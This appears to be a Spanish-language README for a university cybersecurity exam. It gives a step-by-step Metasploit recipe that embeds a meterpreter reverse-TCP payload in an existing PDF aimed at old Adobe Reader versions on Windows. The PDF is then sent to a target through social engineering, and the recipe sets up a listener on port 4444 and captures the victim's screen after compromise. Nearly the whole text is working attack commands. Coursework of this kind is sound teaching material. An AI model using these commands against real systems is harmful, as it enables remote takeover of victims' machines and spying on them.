# -UDEM--Ciberseguridad
Parcial de Ciberseguridad

Vídeo:

Explicación: Incrusta una Carga (payload) dentro un archivo PDF existente. El archivo PDF resultante puede ser enviado al objetivo como parte de un ataque de ingeniería social.

Sistema Operativo: Windows XP SP3 (Inglés/Español) / Windows Vista / Windows 7 (Inglés)
Programas: Adobe Reader v8.x, v9.x

•	use exploit/windows/fileformat/adobe_pdf_embedded_exe
•	set payload windows/meterpreter/reverse_tcp
•	ifconfig
•	set lhost 10.191.3.4
•	set lport 4444
•	set infilename /root/parcial/el_gigante_egoista.pdf
•	exploit

•	back
•	use exploit/multi/handler
•	set lhost 10.191.3.4
•	set lport 4444
•	exploit

•	Enviar archivo a la máquina que se desea atacar c
•	cuando se tenga el acceso a la máquina atacada se podrá usar todas las herramientas que tiene meterpreter

•	load espia
•	screengrab
